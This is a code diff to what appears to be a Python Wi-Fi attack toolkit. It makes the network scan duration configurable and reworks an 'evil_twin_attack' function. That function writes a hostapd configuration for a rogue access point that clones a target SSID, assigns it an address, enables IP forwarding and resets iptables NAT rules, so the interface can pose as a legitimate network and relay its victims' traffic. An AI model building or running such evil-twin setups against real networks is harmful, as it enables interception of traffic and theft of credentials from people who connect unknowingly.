@@ -289,9 +289,19 @@ def wifi_scan():
         
     subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
     
+    scan_duration = input(f"Enter scan duration in seconds [15]: ").strip() or "15"
+    try:
+        scan_duration = int(scan_duration)
+        if scan_duration < 5:
+            print("[!] Scan duration too short, using 5 seconds")
+            scan_duration = 5
+    except:
+        print("[!] Invalid duration, using 15 seconds")
+        scan_duration = 15
+    
     try:
         try:
-            print("[*] Scanning networks (this will take at least 15 seconds)...")
+            print(f"[*] Scanning networks (this will take at least {scan_duration} seconds)...")
             
             temp_file = f"temp_scan_{int(time.time())}.txt"
             
@@ -302,7 +312,7 @@ def wifi_scan():
                 )
             
             print("[*] Scanning networks...")
-            for i in range(15, 0, -1):
+            for i in range(scan_duration, 0, -1):
                 sys.stdout.write(f"\r[*] Scan in progress... {i} seconds remaining")
                 sys.stdout.flush()
                 time.sleep(1)
@@ -325,10 +335,10 @@ def wifi_scan():
                 
         except:
             print("[*] Using iwlist for scanning...")
-            print("[*] This will take at least 15 seconds...")
+            print(f"[*] This will take at least {scan_duration} seconds...")
             scan_process = subprocess.Popen(["iwlist", selected_interface, "scan"], stdout=subprocess.PIPE)
             
-            for i in range(15, 0, -1):
+            for i in range(scan_duration, 0, -1):
                 sys.stdout.write(f"\r[*] Scan in progress... {i} seconds remaining")
                 sys.stdout.flush()
                 time.sleep(1)
@@ -811,8 +821,7 @@ def evil_twin_attack():
     print(f"\n[*] Setting up Evil Twin AP '{target_ssid}' on channel {channel}...")
     
     try:
-        subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
-        subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
+        subprocess.run(["rfkill", "unblock", "wifi"], check=False)
         
         with open("hostapd.conf", "w") as f:
             f.write(f"interface={selected_interface}\n")
@@ -830,9 +839,12 @@ def evil_twin_attack():
             f.write("log-queries\n")
             f.write("log-dhcp\n")
         
-        subprocess.run(["ifconfig", selected_interface, "192.168.1.1", "netmask", "255.255.255.0", "up"], check=False)
+        subprocess.run(["ip", "link", "set", selected_interface, "down"], check=False)
+        subprocess.run(["ip", "addr", "flush", "dev", selected_interface], check=False)
+        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", selected_interface], check=False)
+        subprocess.run(["ip", "link", "set", selected_interface, "up"], check=False)
         
-        subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], shell=True, check=False)
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
         
         subprocess.run(["iptables", "--flush"], check=False)
         subprocess.run(["iptables", "--table", "nat", "--flush"], check=False)
@@ -860,7 +872,6 @@ def evil_twin_attack():
     finally:
         stop_process("dnsmasq")
         stop_process("hostapd")
-        subprocess.run(["systemctl", "restart", "NetworkManager"], check=False)
         print("[+] Evil Twin AP stopped")
 
 def wifi_packet_sniffing():
